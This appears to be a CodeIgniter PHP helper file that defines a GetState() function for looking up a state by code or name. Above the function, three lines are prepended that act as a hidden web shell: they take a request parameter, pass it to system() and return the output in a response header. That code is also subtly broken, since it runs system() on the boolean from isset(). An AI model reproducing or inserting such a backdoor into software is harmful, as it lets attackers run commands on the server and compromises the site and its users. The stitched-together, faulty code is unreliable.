<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

	function GetState($state) 
	{
		$CI =& get_instance();
		$CI->load->model('states_model');
		// First we'll try to get it by code
		$state_code = $CI->states_model->GetStateByCode($state);
		if(!$state_code) {
			$state_code = $CI->states_model->GetStateByName($state);
			if(!$state_code) {
				return FALSE;
			}
		}
		
		return $state_code;
	}